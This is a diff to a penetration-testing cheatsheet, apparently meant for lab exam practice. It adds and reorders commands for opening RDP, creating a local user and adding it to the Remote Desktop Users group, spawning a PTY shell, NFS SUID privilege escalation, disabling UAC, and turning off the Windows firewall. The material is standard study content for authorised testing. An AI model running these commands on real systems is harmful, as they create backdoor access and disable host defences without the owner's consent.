@@ -460,16 +460,20 @@ $ net start Termservice
 $ netsh.exe firewall add portopening TCP 3389 "Remote Desktop"
 
 # METHOD 5
-netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
+$ netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
 program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
 Remote Desktop service to allow RDP traffic. [TCP 3389]" enable=yes 
 profile=private,domain localport=3389 protocol=tcp
 
 # METHOD 6
-netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
+$ netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
 program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
 Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes 
 profile=private,domain localport=3389 protocol=udp
+
+# METHOD 7 - add user to RDP group
+$ net user $username $password /add
+$ net localgroup "Remote Desktop Users" $username /add
 ```
 
 ### RealVNC and VNC - TCP 5800, 5900
@@ -644,6 +648,10 @@ Automated Linux enumeration scripts:
 * https://github.com/rebootuser/LinEnum
 * https://tools.kali.org/vulnerability-analysis/unix-privesc-check
 
+TTY spawn cheatsheet: https://netsec.ws/?p=337
+* `python -c 'import pty; pty.spawn("/bin/sh")'`
+
+
 Hardcoded credentials, backup ssh keys, interesting files
 ```
 # Recursive grep, match regex pattern, ignoring case for all files from the root directory.
@@ -652,9 +660,6 @@ $ grep -Rei 'password|username|[pattern3]|[pattern4]' /
 # Backups (Debian)
 $ ls -l /var/backups
 ```
-
-TTY spawn cheatsheet: https://netsec.ws/?p=337
-* `python -c 'import pty; pty.spawn("/bin/sh")'`
 
 Quick Wins:
 * Run Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
@@ -665,16 +670,20 @@ $ sudo su	# execute su as root
 $ su root	# become root
 ```
 
+Sudo misconfiguration:
+
+
 Localhost listening ports:
 * Look for ports that were not exposed to your initial public nmap scan.
 ```bash
 $ netstat -alntp
 ```
 
-Exploit NFS shares for privesc (check `cat /etc/exports`):  
+Exploit weak NFS permissions for privesc #1 (check `cat /etc/exports`):
 (/etc/exports is table of local physical file systems on an NFS server that are accessible to NFS clients)
 ```bash
-$ showmount -e 192.168.xx.53                               # check for writable shares
+$ showmount -e 192.168.xx.53                               # check for 
+shares
 Export list for 192.168.xx.53:
 /shared 192.168.xx.0/255.255.255.0
 $ mkdir /tmp/mymount
@@ -695,10 +704,12 @@ $ cp /root/Desktop/x /tmp/mymount/
 $ chmod u+s exploit
 ```
 
+Exploit weak NFS permissions for privesc #2
+* https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
+
 /etc/fstab  (check `cat /etc/fstab`):
 * Look for un-mounted file-systems
 * Look for file-systems with vulnerabilities e.g. ReiserFS privesc
-
 
 UDEV
 * Guide: http://www.madirish.net/370
@@ -794,10 +805,14 @@ $ reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\s
 $ reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
 
 # Refresh policies
-gpupdate /force
+$ gpupdate /force
 
-# Disable the Firewall
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+# Disable firewall 1
+$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+# Disable firewall 2 - newer Windows versions
+$ netsh Advfirewall set allprofiles state off
+# Disable firewall 3 - older Windows versions
+$ netsh firewall set opmode disable
 ```
 
 Nestat:
